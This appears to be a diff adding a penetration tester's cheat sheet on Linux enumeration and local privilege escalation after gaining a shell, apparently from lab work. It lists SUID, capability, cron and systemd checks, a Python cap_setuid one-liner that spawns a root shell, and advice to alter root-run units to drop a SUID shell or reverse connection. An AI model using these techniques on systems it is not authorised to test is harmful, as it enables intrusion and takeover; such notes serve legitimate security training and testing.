@@ -1,0 +1,70 @@
+# topic: linux-privesc
+# desc: Post-foothold Linux enumeration and local privilege escalation.
+
+## linux-foothold-sweep
+# tags: privesc, enumeration, foothold, checklist
+# desc: First-five-minutes enumeration sweep after landing a shell.
+Run immediately on foothold to orient and catch easy wins:
+
+  id                 # current user, groups (look for docker, lxd, sudo, adm)
+  sudo -l            # sudo rules — highest-yield single check
+  getcap -r / 2>/dev/null
+  find / -perm -4000 -type f 2>/dev/null    # SUID
+  cat /etc/passwd    # users, shells, uid 0 anomalies
+  ps aux             # running services, creds in args (e.g. Jupyter token)
+  ss -tlnp           # listening services (internal-only ports to pivot to)
+
+## linux-suid-sgid
+# tags: privesc, suid, sgid, gtfobins
+# desc: Find SUID/SGID binaries and triage against GTFOBins.
+  find / -perm -4000 -type f 2>/dev/null    # SUID
+  find / -perm -2000 -type f 2>/dev/null    # SGID
+
+Cross-reference each non-standard binary against GTFOBins for a
+SUID-abuse invocation. Distro defaults (passwd, sudo, mount, su) are
+usually noise; an out-of-place or custom binary with the bit set is the
+target.
+
+## linux-capabilities
+# tags: privesc, capabilities, getcap
+# desc: Enumerate file capabilities for escalation primitives.
+  getcap -r / 2>/dev/null
+
+Flag binaries holding cap_setuid, cap_dac_override, cap_dac_read_search,
+or cap_sys_admin. cap_setuid on an interpreter (python, perl) is a direct
+root path, e.g. for python with cap_setuid+ep:
+
+  python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+## linux-writable-units-cron
+# tags: privesc, systemd, cron, writable
+# desc: Writable scheduled-execution paths run as root.
+  cat /etc/crontab; ls -la /etc/cron.*
+  systemctl list-timers
+  find / -writable -name '*.service' 2>/dev/null
+  find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys)'
+
+A world-writable cron script, or a writable systemd unit/timer executed
+by root, is a direct escalation: modify ExecStart / the script body to
+drop a SUID shell or reverse connection, then wait for the trigger.
+
+## linux-snap-version
+# tags: privesc, snap, cve
+# desc: Check snapd/snap-confine version against known privesc CVEs.
+  snap version
+
+Assess snap-confine against e.g. CVE-2019-7304 (dirty_sock) and
+CVE-2021-44730 / CVE-2021-44731. Relevant when snapd is present and other
+vectors are dry.
+
+## linux-escalation-techniques
+# tags: privesc, summary, techniques
+# desc: Quick index of escalation vectors seen across lab boxes.
+Common working vectors to check in rough priority order:
+  - sudo -l misconfig (GTFOBins on the allowed binary)
+  - writable systemd unit / timer run by root
+  - SUID PATH hijack (SUID binary calling a bare command name)
+  - world-writable root cron script
+  - capabilities (cap_setuid on an interpreter)
+  - service-specific CVE (snap-confine, pkexec/PwnKit, etc.)
+  - credential reuse: recovered web/db creds against local accounts / SSH
